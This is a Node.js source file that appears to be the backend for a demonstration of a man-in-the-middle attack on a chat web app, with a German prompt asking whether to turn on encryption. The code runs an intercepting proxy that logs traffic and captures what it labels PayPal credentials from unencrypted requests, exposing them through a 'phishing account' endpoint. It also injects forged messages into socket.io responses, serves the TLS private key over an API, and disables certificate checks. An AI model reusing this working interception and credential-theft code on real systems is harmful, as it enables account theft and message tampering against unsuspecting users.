const proxyPort = 3002;

const Cap = require('cap').Cap;
var Proxy = require('http-mitm-proxy');
var proxy = Proxy();

let packetList = [];
let paypalCreds = 'No account data collected yet.';
let inject = undefined;

const backendPort = 3001;
const express = require('express');
const cors = require('cors');
const { Server } = require('socket.io');
const app = express();
const https = require('https');
const fs = require('fs');
const path = require('path');
const prompt = require('prompt');
const { exec } = require('child_process');
// const open = require('open');

const cert = fs.readFileSync(path.join(__dirname, '../cert.pem'));
const key = fs.readFileSync(path.join(__dirname, '../key.pem'));
let TLS_ACTIVE = false;

const properties = [
  {
    description: 'Wollen Sie die App verschlüssen (J/N)? ',
    name: 'encrypt',
    validator: /\b(yes|no|ja|nein|j|n|y)\b/i,
    warning: 'Eingabe nicht gültig.',
  },
];

prompt.start();

function execPromise(cmd) {
  return new Promise((resolve, reject) => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) {
        console.warn(error);
      }
      resolve(stdout ? stdout : stderr);
    });
  });
}

prompt.get(properties, function (err, result) {
  if (err) {
    console.log(err);
    process.exit(0);
  }
  if (/\b(yes|y|ja|j)\b/i.test(result.encrypt)) {
    process.env['REACT_APP_SERVER_HTTPS'] = true;
    process.env['HTTPS'] = true;
    TLS_ACTIVE = true;
  }

  const APP_URL = `http${
    process.env['HTTPS'] ? 's' : ''
  }://platin.demo.com:3000`;

  // exec('serve -s build');
  // exec('npm start');
  // `npx live-server build --port=3000 --cors --entry-file=index.html --host=platin.demo.com --https=./https.config.js`

  // exec('ls', (error, stdout, stderr) => {
  //   if (error) {
  //     console.error(`exec error: ${error}`);
  //     return;
  //   }
  //   console.log(`stdout: ${stdout}`);
  //   console.error(`stderr: ${stderr}`);
  // });

  exec(
    process.env['HTTPS']
      ? `npm start`
      : `npx live-server build --port=3000 --cors --entry-file=index.html --host=platin.demo.com `,
    (error, stdout, stderr) => {
      if (error) {
        console.error(`exec error: ${error}`);
        return;
      }
      console.log(`stdout: ${stdout}`);
      console.error(`stderr: ${stderr}`);
    }
  );

  console.log(`\x1b[${process.env['HTTPS'] ? '32' : '33'}m`);
  console.log(`App running on ${APP_URL}`, '\x1b[0m');

  let server;
  if (process.env['REACT_APP_SERVER_HTTPS']) {
    process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;
    server = https
      .createServer({ cert, key, rejectUnauthorized: false }, app)
      .listen(backendPort, () => {
        console.log(`TLS Backend running on ${backendPort}`);
      });
  } else {
    server = app.listen(backendPort, () => {
      console.log(`Non-TLS Backend running on ${backendPort}`);
    });
  }

  const io = new Server(server, {
    cors: {
      origin: '*',
      methods: ['GET', 'POST'],
    },
    transports: ['polling'],
  });

  io.on('connection', (socket) => {
    console.log(`User ${socket.id} connected.`);
    socket.on('send', (content) => {
      socket.broadcast.emit('receive', content);
      console.log(content);
    });
  });

  app.use(cors());

  app.get('/', (req, res) => {
    return res.send('Backend running.');
  });

  app.get('/tls-status', (req, res) => {
    return res.send(TLS_ACTIVE);
  });

  app.post('/', (req, res) => {
    console.log('POST placeholder invoked');
  });

  app.get('/api/devices', (req, res) => {
    return res.send(getDeviceList());
  });

  app.get('/api/account', async (req, res) => {
    return res.send(getPhishingAccount());
  });

  app.get('/api/packet', async (req, res) => {
    return res.send(getRecentPackets());
  });

  app.get('/api/inject', async (req, res) => {
    if ('msg' in req.query) {
      return res.send(injectMessage(req.query.msg));
    }
  });

  app.get('/api/expose', async (req, res) => {
    console.log(req.query.get);
    return res.send(exposeCert(req.query.get));
  });

  proxy.onCertificateRequired = function (hostname, callback) {
    return callback(null, {
      keyFile: key,
      certFile: cert,
    });
  };

  proxy.onError(function (ctx, err, errorKind) {
    var url =
      ctx && ctx.clientToProxyRequest ? ctx.clientToProxyRequest.url : '';
    if (errorKind !== 'HTTPS_CLIENT_ERROR') {
      console.error(errorKind + ' on ' + url + ':', err);
    }
  });

  proxy.onRequest(function (ctx, callback) {
    return callback();
  });

  proxy.onRequestData(function (ctx, chunk, callback) {
    if (chunk.length > 10 && chunk.length < 1000) {
      if (chunk.length > 80) {
        console.log('packet length: ' + chunk.length);
      }
      let rawPacketData = chunk.slice(2, chunk.length);
      let decodedASCII = rawPacketData.toString();
      console.log(decodedASCII);
      packetList.push(`packet: length ${chunk.length}, ${decodedASCII}`);
      if (decodedASCII.startsWith('f=is3ML') && !TLS_ACTIVE) {
        paypalCreds = decodedASCII;
      }
      if (packetList.length > 5) {
        packetList.shift();
      }
    }
    return callback(null, chunk);
  });

  proxy.onResponse(function (ctx, callback) {
    return callback(null);
  });

  proxy.onResponseData(function (ctx, chunk, callback) {
    if (
      chunk.length > 10 &&
      chunk.length < 300 &&
      !ctx.clientToProxyRequest.url.startsWith('/api')
    ) {
      let rawPacketData = chunk.slice(2, chunk.length);
      let decodedASCII = rawPacketData.toString();
      console.log(decodedASCII);
      if (inject !== undefined && decodedASCII.startsWith('["receive",')) {
        let bufferMsg = `42["receive","${inject}"]`;
        console.log('changing..');
        chunk = Buffer.from(bufferMsg, 'ascii');
        packetList.push(`packet: length ${chunk.length}, ${bufferMsg}`);
      } else {
        packetList.push(`packet: length ${chunk.length}, ${decodedASCII}`);
      }
      if (packetList.length > 5) {
        packetList.shift();
      }
    }
    return callback(null, chunk);
  });

  proxy.onWebSocketMessage(function (ctx, message, callback) {});

  proxy.listen({ port: proxyPort }, () => {
    console.log('Proxy running on ' + proxyPort);
  });
});

function getDeviceList() {
  return Cap.deviceList();
}

function getRecentPackets() {
  const response = [...packetList];
  return { response };
}

function injectMessage(msg) {
  if (msg === 'clear') {
    inject = undefined;
  } else {
    console.log('INSCRIBING INJECT');
    inject = msg;
  }
}

function getPhishingAccount() {
  return { paypalCreds };
}

function exposeCert(get) {
  let response;
  if (get === 'cert') {
    response = cert.toString();
  }
  if (get === 'key') {
    response = key.toString();
  }
  return { response };
}

module.exports = {
  getDeviceList,
  getRecentPackets,
  injectMessage,
  getPhishingAccount,
  exposeCert,
  execPromise,
};
